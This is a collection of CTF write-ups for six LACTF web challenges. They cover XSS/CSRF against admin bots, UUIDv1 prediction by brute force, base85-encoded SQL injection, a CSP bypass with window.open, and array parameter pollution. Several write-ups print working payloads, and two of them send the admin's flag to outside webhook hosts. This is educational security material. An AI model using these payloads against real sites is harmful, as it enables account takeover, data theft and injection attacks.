# metaverse - web

## Description
Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

metaverse.lac.tf

You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!

## TL;DR

In this challenge we have to get the `displayName` admin by befriending the admin. We can do this using XSS and CSRF techniques, so that later we can force the admin to be friends with our account and we will get the flag in the admin display name.

## How to solve
### Recon
In this challenge, we are given a web challenge link and a bot link. We are also given the source code of this challenge in the form of `index.js` as follows:

```javascript=
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const { v4: uuid } = require("uuid");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
const posts = new Map();

const app = express();

let cleanup = [];

// clean up?
setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex((x) => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j++) {
        const account = accounts.get(cleanup[i][0]);
        for (const post of account.posts) {
            posts.delete(post);
        }
        accounts.delete(cleanup[i][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

function needsAuth(req, res, next) {
    if (!res.locals.user) {
        res.redirect("/login");
    } else {
        next();
    }
}

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.locals.user = null;
    if (req.cookies.login) {
        const chunks = req.cookies.login.split(":");
        if (chunks.length === 2 && accounts.has(chunks[0]) && accounts.get(chunks[0]).password === chunks[1]) {
            res.locals.user = chunks[0];
        }
    }
    next();
});

// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});

app.get("/", needsAuth);
app.get("/login", (req, res, next) => {
    if (res.locals.user) {
        res.redirect("/");
    } else {
        next();
    }
});
app.use(express.static(path.join(__dirname, "static"), { extensions: ["html"] }));

app.post("/register", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string" || typeof req.body.displayName !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    const displayName = req.body.displayName.trim();
    if (!/^[\w]{3,32}$/.test(username) || !/^[-\w !@#$%^&*()+]{3,32}$/.test(password) || !/^[-\w ]{3,64}/.test(displayName)) {
        res.redirect("/login#" + encodeURIComponent("Invalid metavalues provided for metafields."));
        return;
    }
    if (accounts.has(username)) {
        res.redirect("/login#" + encodeURIComponent("Metaaccount already metaexists."));
        return;
    }
    accounts.set(username, { password, displayName, posts: [], friends: [] });
    cleanup.push([username, Date.now() + 1000 * 60 * 60 * 12]);
    res.cookie("login", `${username}:${password}`, { httpOnly: true });
    res.redirect("/");
});

app.post("/login", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    if (accounts.has(username) && accounts.get(username).password === password) {
        res.cookie("login", `${username}:${password}`, { httpOnly: true });
        res.redirect("/");
    } else {
        res.redirect("/login#" + encodeURIComponent("Wrong metausername/metapassword."));
    }
});

app.post("/friend", needsAuth, (req, res) => {
    res.type("text/plain");
    const username = req.body.username.trim();
    if (!accounts.has(username)) {
        res.status(400).send("Metauser doesn't metaexist");
    } else {
        const user = accounts.get(username);
        if (user.friends.includes(res.locals.user)) {
            res.status(400).send("Already metafriended");
        } else {
            user.friends.push(res.locals.user);
            res.status(200).send("ok");
        }
    }
});

app.post("/post", needsAuth, (req, res) => {
    res.type("text/plain");
    const id = uuid();
    const content = req.body.content;
    if (typeof content !== "string" || content.length > 1000 || content.length === 0) {
        res.status(400).send("Invalid metacontent");
    } else {
        const user = accounts.get(res.locals.user);
        posts.set(id, content);
        user.posts.push(id);
        res.send(id);
    }
});

app.get("/posts", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts.get(res.locals.user).posts.map((id) => {
                const content = posts.get(id);
                return {
                    id,
                    blurb: content.length < 50 ? content : content.slice(0, 50) + "...",
                };
            })
        )
    );
});

app.get("/friends", needsAuth, (req, res) => {
    res.type("application/json");
    res.send(
        JSON.stringify(
            accounts
                .get(res.locals.user)
                .friends.filter((username) => accounts.has(username))
                .map((username) => ({
                    username,
                    displayName: accounts.get(username).displayName,
                }))
        )
    );
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

The first thing we need to know is that the flags are in `displayName` admin:

```javascript=
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```

We can get `displayName` from the admin by befriending the admin by posting a request to `/friend`

```javascript=
app.post("/friend", needsAuth, (req, res) => {
    res.type("text/plain");
    const username = req.body.username.trim();
    if (!accounts.has(username)) {
        res.status(400).send("Metauser doesn't metaexist");
    } else {
        const user = accounts.get(username);
        if (user.friends.includes(res.locals.user)) {
            res.status(400).send("Already metafriended");
        } else {
            user.friends.push(res.locals.user);
            res.status(200).send("ok");
        }
    }
});
```

We can get `displayName` from the admin by making friends with the admin by posting a request to `/friend` with our username.

![](https://i.imgur.com/Nb7kjcU.png)

### Exploit

To exploit this challenge, we can use XSS in `/post/:id` where in the code it will replace `$CONTENT` without sanitizing it first so it is vulnerable with XSS.

```javascript=
// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});
```

We can take advantage of this XSS by creating a new `metapost` and using the payload below to make a post request to `/friend` and force the admin to be friends with the `username`, which is our account.

![](https://i.imgur.com/WPsox7J.png)

payload:

```htmlbars=
<script>
    const username = "asd"
    fetch("/friend", {
        method: "POST",
        mode:"no-cors",
        headers:{
            "Content-Type":"application/x-www-form-urlencoded"
        },
        body:"username="+username,
    })
</script>
```

We post and we will get a link to the post, example:

```
https://metaverse.lac.tf/post/4c92e335-e93a-4662-beb8-e2ea478167dc
```

We send this to the admin bot to trigger XSS on the admin account, and don't forget to friend the admin as well so we can get the flag.

![](https://i.imgur.com/tmn8rQn.png)

# uuid hell - web

## Description

UUIDs are the best! I love them (if you couldn't tell)!

Site: uuid-hell.lac.tf

## How to solve
### TL;DR
In this challenge we need to get the UUID from one of the admins and use it as a cookie to get the flag from the server. We are only given the admin hash by the server, but since the admin UUID is not so random, we can use a bruteforce technique and reduce bruteforce time by using `Date` from the server.

### Recon

in this challenge we are given the url and also the source code of the challenge:

```javascript
const uuid = require('uuid');
const crypto = require('crypto')

function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}

let adminuuids = []
let useruuids = []
function isAdmin(uuid) {
    return adminuuids.includes(uuid);
}
function isUuid(uuid) {
    if (uuid.length != 36) {
        return false;
    }
    for (const c of uuid) {
        if (!/[-a-f0-9]/.test(c)) {
            return false;
        }
    }
    return true;
}

function getUsers() {
    let output = "<strong>Admin users:</strong>\n";
    adminuuids.forEach((adminuuid) => {
        const hash = crypto.createHash('md5').update("admin" + adminuuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    output += "<br><br><strong>Regular users:</strong>\n";
    useruuids.forEach((useruuid) => {
        const hash = crypto.createHash('md5').update(useruuid).digest("hex");
        output += `<tr><td>${hash}</td></tr>\n`;
    });
    return output;

}

const express = require('express');
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());



app.get('/', (req, res) => {
    let id = req.cookies['id'];
    if (id === undefined || !isUuid(id)) {
        id = randomUUID();
        res.cookie("id", id);
        useruuids.push(id);
    } else if (isAdmin(id)) {
        res.send(process.env.FLAG);
        return;
    }

    res.send("You are logged in as " + id + "<br><br>" + getUsers());
});

app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});

app.listen(process.env.PORT);
```

Display of the challenge website:

![](https://i.imgur.com/0EwlHWt.png)


What's interesting here is how `randomUUID` is generated:

```javascript=
function randomUUID() {
    return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
}
```

It uses `node` as well as `clockseq`. After trial & error it turns out that the result of the `randomUUID` function is not so random:

![](https://i.imgur.com/MVsidY8.png)

From the picture above it can be concluded that `radomUUID` is not so random, only the first 4 bytes change and the changes are always increasing, so I conclude that it may be affected by the time of the server.

To see the time from the server we can see the HTTP response header `Date` given by the server using the `curl` command:

```shell=
curl https://uuid-hell.lac.tf/ -v
```

output:

```
...snip...
< HTTP/2 200 
< date: Mon, 13 Feb 2023 00:45:31 GMT
< content-type: text/html; charset=utf-8
< x-powered-by: Express
< set-cookie: id=b7b9c6f0-ab37-11ed-aa64-67696e6b6f69; Path=/
< cf-cache-status: DYNAMIC
...snip...
```

More or less I used the code below to get the UUID from the server, but the results are slightly different, possibly due to delay from the server.

```javascript
const uuid = require('uuid');

function randomUUID() {
    return uuid.v1({
        'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69],
        'clockseq': 0b10101001100100,
        "msecs": Date.parse("Mon, 13 Feb 2023 00:45:31 GMT") ,
    });
}
console.log(randomUUID())
```

There is also something interesting here, namely that we can create an admin and the hash will later be visible on the main server page.

```javascript
app.post('/createadmin', (req, res) => {
    const adminid = randomUUID();
    adminuuids.push(adminid);
    res.send("Admin account created.")
});
```

### Exploit

We already know that we can create a new admin and get the hash in the web page challenge. From here we can bruteforce the first 4 bytes of the UUID, but since it will definitely take a long time to bruteforce it we need to use the `Date` from the server and after that we can bruteforce it to match the admin hash we just created in `/createadmin`. Here's the script I use to bruteforce and get the `Date` from the server:

```python
import hashlib
import requests
from subprocess import check_output
import re

URL = "https://uuid-hell.lac.tf"


def get_info(url=URL):
    class Info:
        date: str
        uuid: str
        hash: str

    res = requests.post(url+"/createadmin")
    info = Info
    info.date = res.headers.get("Date")
    res = requests.get(url)
    info.uuid = re.findall(r"(?<=as ).*?(?=<br>)", res.text)[-1]
    info.hash = re.findall(r"(?<=<tr><td>).*?(?=</td></tr>)", res.text)[49]
    return info


def compare_uuid(count, info=get_info()):
    script = """
    const uuid = require('uuid');
    const crypto = require('crypto')

    function randomUUID() {
        return uuid.v1({
            'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69],
            'clockseq': 0b10101001100100,
            "msecs": Date.parse("%s")+%d
        });
    }
    console.log(randomUUID())
    """ % (info.date, count)

    uuid = check_output(['node', '-e', script]).decode().strip()
    md5 = hashlib.md5()
    md5.update(("admin"+uuid).encode())
    if md5.hexdigest() == info.hash:
        print("admin uuid: "+uuid)
        return
    print(md5.hexdigest(), info.hash, uuid, info.uuid)
    compare_uuid(count+1)


compare_uuid(0)
```

After running it will generate an admin UUID like the following:

![](https://i.imgur.com/dYD8Yaf.png)

We put it in the cookie, and we'll get the flag.

![](https://i.imgur.com/sWa4R1x.png)


# 85_reasons_why
## Description

If you wanna catch up on ALL the campus news, check out my new blog. It even has a reverse image search feature!

85-reasons-why.lac.tf

## How to solve
### TL;DR

This challenge is a SQL Injection challenge with several filters, namely base85 and also an unsecure custom escape. In this challenge we need to get a secret post that contains the flag.

### Recon

In the given source code there is an interesting function, namely `serialize_image`, this function accepts base85 input and after that sanitizes the quote with `re.sub`, this possibility is not secure.

```python
def serialize_image(pp):
    b85 = base64.a85encode(pp)
    b85_string = b85.decode('UTF-8', 'ignore')

    # identify single quotes, and then escape them
    b85_string = re.sub('\\\\\\\\\\\\\'', '~', b85_string)
    b85_string = re.sub('\'', '\'\'', b85_string)
    b85_string = re.sub('~', '\'', b85_string)

    b85_string = re.sub('\\:', '~', b85_string)
    return b85_string
```

After that the function is used in `/image-search` where if we look there is a SQL Injection vulnerability in the variable `a`

```python

@app.route('/image-search', methods=['GET', 'POST'])
def image_search():
    if 'image-query' not in request.files or request.method == 'GET':
        return render_template('image-search.html', results=[])

    incoming_file = request.files['image-query']
    size = os.fstat(incoming_file.fileno()).st_size
    if size > MAX_IMAGE_SIZE:
        flash("image is too large (50kb max)");
        return redirect(url_for('home'))

    spic = serialize_image(incoming_file.read())
    print(spic)

    try:
        a = "select parent as PID from images where b85_image = '{}' AND ((select active from posts where id=PID) = TRUE)".format(spic) # <- have sql injection 
        print(a)
        res = db.session.connection().execute(\
            text(a))
    except Exception:
        return ("SQL error encountered", 500)

    results = []
    for row in res:
        post = db.session.query(Post).get(row[0])
        if (post not in results):
            results.append(post)

    return render_template('image-search.html', results=results)
```

Here we should be able to do SQLI, but since it encodes our input using `base64.a85encode` we have to first decode our payload using `base64.a85decode` and we have to be careful with the padding of base85 because it can make our payload giberish and become invalid.

### Exploit

After trial and error I found the bypass for the WAF, which is as follows:

```python
a = base64.a85decode(b"""\\\\\\\\\\\\\\\\''/**/or/**/1--aa""")
print(a)
```

A little explanation of the payload above.
- `\\\\\\\\\\\\\\\''` in payload is used to bypass single quote
- `aa` is used for padding so that the payload generates a valid base85 and not giberish.

After that we can send the results from the script above to `/image-search` or use the script I made to send the payload.

```python 
import requests
import base64

# URL = "http://localhost:4444/"
URL = "https://85-reasons-why.lac.tf/"


def send_img(img, url=URL):
    res = requests.post(
        url+"image-search",
        files={"image-query": ('foo.jpeg', img, 'image/png')},
        # proxies={"https": "http://127.0.0.1:8080"},
        verify=False
    )
    return res.text

a = base64.a85decode(b"""\\\\\\\\\\\\\\\\''/**/or/**/1--aa""")
print(send_img(a))
b = base64.a85encode(a)
print(b)
```

We run after that we will get the flag in the hidden post.

![](https://i.imgur.com/sTYkxQd.png)

# california-state-police - web
## Description

Stop! You're under arrest for making suggestive 3 letter acronyms!

california-state-police.lac.tf

Admin Bot (note: the adminpw cookie is HttpOnly and SameSite=Lax)

## How to solve

### Recon

In this challenge we are given the following source code:

```javascript
const express = require("express");
const path = require("path");
const { v4: uuid } = require("uuid");
const cookieParser = require("cookie-parser");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const app = express();

const reports = new Map();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex(x => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j ++) {
        reports.delete(cleanup[j][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));

app.get("/flag", (req, res) => {
    res.status(400).send("you have to POST the flag this time >:)");
});

app.post("/flag", (req, res) => {
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(400).send("no hacking allowed");
    }
});

app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'none'; script-src 'unsafe-inline'"
    );
    next();
});

app.post("/report", (req, res) => {
    res.type("text/plain");
    const crime = req.body.crime;
    if (typeof crime !== "string") {
        res.status(400).send("no crime provided");
        return;
    }
    if (crime.length > 2048) {
        res.status(400).send("our servers aren't good enough to handle that");
        return;
    }
    const id = uuid();
    reports.set(id, crime);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.redirect("/report/" + id);
});

app.get("/report/:id", (req, res) => {
    if (reports.has(req.params.id)) {
        res.type("text/html").send(reports.get(req.params.id));
    } else {
        res.type("text/plain").status(400).send("report doesn't exist");
    }
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

We can get the flag by posting a request to the `/flag` page, but the server will check to see if we have a valid `adminpw` cookie. Because the `adminpw` cookie is owned by the admin bot only the admin bot can access the flags on the page `/flag`

```javascript
app.post("/flag", (req, res) => {
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(400).send("no hacking allowed");
    }
});
```

Judging by the source code snippet below, `/report/:id` will send us a raw html response, which we can use to perform XSS and CSRF.

```javascript
app.get("/report/:id", (req, res) => {
    if (reports.has(req.params.id)) {
        res.type("text/html").send(reports.get(req.params.id));
...snip...
```

But we see that there is a middle ware that adds a CSP header to every incoming request.

```javascript
app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'none'; script-src 'unsafe-inline'"
    );
    next();
});
```

What's interesting here is the CSP `default-src 'none'`. The CSP `default-src 'none'` will prevent us from accessing the `/flag` page so we cannot perform CSRF in the normal way.
> For reference csp default-src can be seen here [default-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src)

### Exploit

I just finished this CTF when LACTF ended, I don't know how to do it, but after asking on the writeup channel I was given the following reference

> https://lalitjc.wordpress.com/2013/05/03/2/

I am also given an example as follows.

```html
<form method="post" id="theForm" action="/flag" target='a'>
</form>
<script> 
    let w = window.open('','a');
    document.getElementById('theForm').submit();
    setTimeout(()=>{
        document.location= 'http://webhook?'+w.document.body.innerHTML
    },500);
</script>
```

A little explanation of the payuload above. The above payload will generate a new window using `window.open` it will associate it with `target=a` in the `form` element, so when we submit the form using `document.getElementById('theForm').submit ();` it will be associated with the variable `w` and we will be able to access the DOM of the new page.

![](https://i.imgur.com/NTh8PTA.png)

After that we use the payload and don't forget to replace `document.location` to our webhook. We send the url of our payload, and we'll get the flag.

![](https://i.imgur.com/LNikobb.png)

# queue up! - web

## Description
I've put the flag on a web server, but due to high load, I've had to put a virtual queue in front of it. Just wait your turn patiently, ok? You'll get the flag eventually.

Disclaimer: Average wait time is 61 days.

Site: qu-flag.lac.tf

## How to solve

### Recon
In this challenge, we are given 2 servers, namely the flag server https://qu-flag.lac.tf/ and the queue server https://qu-queue.lac.tf/ . We are also given the source code.

After reviewing the source code we found something interesting in the `flagserver` :

`./flagserver/flagserver.js`
```javascript
// If post, check if uuid has finished the queue, and if so, show flag
app.post("/", async function (req, res) {
    let uuid;
    try {
        uuid = req.body.uuid;
    } catch {
        res.send("uuid?"+uuid);
        return;
    }

    if (uuid.length != 36) {
        res.send("len! "+uuid.length);
        return;
    }
    for (const c of uuid) {
        console.log(c)
        if (!/[-a-f0-9]/.test(c)) {
            res.send("did'n match"+uuid)
            return;
        }
    }
    const requestUrl = `http://queue:${process.env.QUEUE_SERVER_PORT}/api/${uuid}/status`;
    try {
        const result = await (await fetch(requestUrl, {
            headers: new Headers({
                'Authorization': 'Bearer ' + process.env.ADMIN_SECRET
            })
        })).text();
        if (result === "true") {
            console.log("Gave flag to UUID " + uuid);
            res.send(process.env.FLAG);
        } else {
            res.redirect(process.env.QUEUE_SERVER_URL);
        }
    } catch {
        res.redirect(process.env.QUEUE_SERVER_URL);
    }

});
```

In the source code snippet above we can see that the server will check for the `uuid` parameter but here it doesn't check whether the `uuid` parameter we entered is a `string` or not, so we can make the `uuid` parameter an array and bypass that check it's in the source code above.

After that we can rewrite the `requestURL` and make it access `/api/:uuid/bypass` to make our `uuid` user `server:true` so we can get the flag.

```javascript
    app.get("/api/:uuid/bypass", async (req, res) => {
        try {
            const user = await Queue.findByPk(req.params.uuid);
            if (user === undefined) {
                res.send("uuid not found");
            } else {
                await user.update({served: true});
                res.send("bypassed");
            }
        } catch {
            res.send("invalid uuid");
        }

    });
```

### Exploitation

To exploit this we have to make a request to the `flagserver` namely https://qu-flag.lac.tf/ after that we send a request which contains 36 post request `uuid` as follows to bypass `uuid.length != 36` and also regex.

```shell
curl -X POST https://qu-flag.lac.tf/ -d "uuid=e7d9cd88-ecfb-45c2-bea1-e1727a25f8b8/bypass#&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f&uuid=f" -H "Content-Type: application/x-www-form-urlencoded"
```

in the first uuid parameter we need to include a `#` so that the rest of the payload is ignored by the server, we also need to add `e7d9cd88-ecfb-45c2-bea1-e1727a25f8b8/bypass` to make a request to `/api/:uuid/bypass` and sets the `serve` of our uuid to true.

Run curl above and return to https://qu-flag.lac.tf/ then we will get the flag

![](https://i.imgur.com/9E3w9mv.png)


# hptia - web
## Description

I made a new hyper-productive todo list app that limits you to 12 characters per item so you can stop wasting time writing overly intricate todo lists!

Check it out here: hptla.lac.tf

Admin Bot (note: the adminpw cookie is HttpOnly and SameSite=Lax)

## How to solve

### Recon

In this challenge we are given the following source code:

```javascript
const express = require("express");
const path = require("path");
const { v4: uuid } = require("uuid");
const cookieParser = require("cookie-parser");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const app = express();

const lists = new Map();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex(x => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j ++) {
        lists.delete(cleanup[j][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'"
    );
    next();
});
app.use(express.static(path.join(__dirname, "static")));

app.post("/list", (req, res) => {
    res.type("text/plain");
    const list = req.body.list;
    if (typeof list !== "string") {
        res.status(400).send("no list provided");
        return;
    }
    const parsed = list
        .trim()
        .split("\n")
        .map((x) => x.trim());
    if (parsed.length > 20) {v
        res.status(400).send("list must have at most 20 items");
        return;
    }
    if (parsed.some((x) => x.length > 12)) {
        res.status(400).send("list items must not exceed 12 characters");
        return;
    }
    const id = uuid();
    lists.set(id, parsed);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.send(id);
});

app.get("/list/:id", (req, res) => {
    res.type("application/json");
    if (lists.has(req.params.id)) {
        res.send(lists.get(req.params.id));
    } else {
        res.status(400).send({error: "list doesn't exist"});
    }
});

app.get("/flag", (req, res) => {
    res.type("text/plain");
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(401).send("haha no");
    }
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

On the client side we also found interesting js files after looking at the html on `https://hptla.lac.tf/view.html` :

`https://hptla.lac.tf/view.js`
```javascript
const loading = document.getElementById("loading");
const error = document.getElementById("error");
const list = document.getElementById("list");
const id = location.hash.slice(1);
if (!/^[-0-9a-f]+$/.test(id)) {
    error.innerText = "invalid list id";
    error.classList.remove("hidden");
    loading.classList.add("hidden");
} else {
    (async function () {
        const res = await fetch("/list/" + id);
        try {
            const json = await res.json();
            if (res.status !== 200) {
                error.innerText = json.error;
                error.classList.remove("hidden");
            } else {
                list.innerHTML = json.map((x, i) => `<li><input type="checkbox" id="item${i}"><label for="item${i}">${x}</label></li>`).join("");
                list.classList.remove("hidden");
            }
            loading.classList.add("hidden");
        } catch (err) {
            error.innerText = "something went really wrong";
            error.classList.remove("hidden");
            loading.classList.add("hidden");
        }
    })();
}
```

From `view.js` we can see an interesting thing, namely the use of `.innerHTML` which is not sanitized first so this can lead to XSS attacks.

```javascript
...snip...
                list.innerHTML = json.map((x, i) => `<li><input type="checkbox" id="item${i}"><label for="item${i}">${x}</label></li>`).join("");
...snip...
```

But this XSS will not be easy because we are given a limit of 12 letters per line.

![](https://i.imgur.com/zDc1DAt.png)

In the `index.js` source code, we can also see that there is another restriction, namely that we cannot send a payload of more than 20 lines.

```javascript
...snip...
    if (parsed.length > 20) {v
        res.status(400).send("list must have at most 20 items");
        return;
    }
    if (parsed.some((x) => x.length > 12)) {
        res.status(400).send("list items must not exceed 12 characters");
        return;
    }
...snip...
```

When we send the following payload:

```
<script>
alert(1)
<script>
```

Our payload that we send will change to something like the image below, so we can't do XSS properly.

![](https://i.imgur.com/TZ0Ml5A.png)


### Exploit

To exploit this problem, we can use a comment syntax like the following in js `/*blablabla*/` so that later a tag like the image above will be considered a comment.

Here's the final payload I use to get the XSS and do a CSRF to get the flags that are in the `/flag` page and send them to our server.

```
<img src='
'onerror='/*
*/fetch(/*
*/"/flag")/*
*/.then(/*
*/(a)=>a./*
*/text()/*
*/.then(/*
*/(a)=>/*
*/location/*
*/.href=/*
*/"htt"+/*
*/"p:"+/*
*/"//tc"+/*
*/"p1p"+/*
*/".com"+/*
*/":44"+/*
*/"44?"+/*
*/a))/*
*/'>
```

The payload above will be like this after we submit:

![](https://i.imgur.com/xkHZu3m.png)

When we extract the script for `onerror`, we will get a valid js script like below, which means our XSS will run correctly.

```javascript
/*</label></li><li><input type="checkbox" id="item2"><label for="item2">*/fetch(/*</label></li><li><input type="checkbox" id="item3"><label for="item3">*/"/flag")/*</label></li><li><input type="checkbox" id="item4"><label for="item4">*/.then(/*</label></li><li><input type="checkbox" id="item5"><label for="item5">*/(a)=>a./*</label></li><li><input type="checkbox" id="item6"><label for="item6">*/text()/*</label></li><li><input type="checkbox" id="item7"><label for="item7">*/.then(/*</label></li><li><input type="checkbox" id="item8"><label for="item8">*/(a)=>/*</label></li><li><input type="checkbox" id="item9"><label for="item9">*/location/*</label></li><li><input type="checkbox" id="item10"><label for="item10">*/.href=/*</label></li><li><input type="checkbox" id="item11"><label for="item11">*/"htt"+/*</label></li><li><input type="checkbox" id="item12"><label for="item12">*/"p:"+/*</label></li><li><input type="checkbox" id="item13"><label for="item13">*/"//tc"+/*</label></li><li><input type="checkbox" id="item14"><label for="item14">*/"p1p"+/*</label></li><li><input type="checkbox" id="item15"><label for="item15">*/".com"+/*</label></li><li><input type="checkbox" id="item16"><label for="item16">*/":44"+/*</label></li><li><input type="checkbox" id="item17"><label for="item17">*/"44?"+/*</label></li><li><input type="checkbox" id="item18"><label for="item18">*/a))/*</label></li><li><input type="checkbox" id="item19"><label for="item19">*/
```

Now we send the result url from submitting our payload to the admin bot.

`example url that we goint to send to admin bot`
```
https://hptla.lac.tf/view.html#c5bf2790-ed14-43af-9b8c-80f28aba90c5
```

and we will get the flag.

![](https://i.imgur.com/hCMoG2a.png)

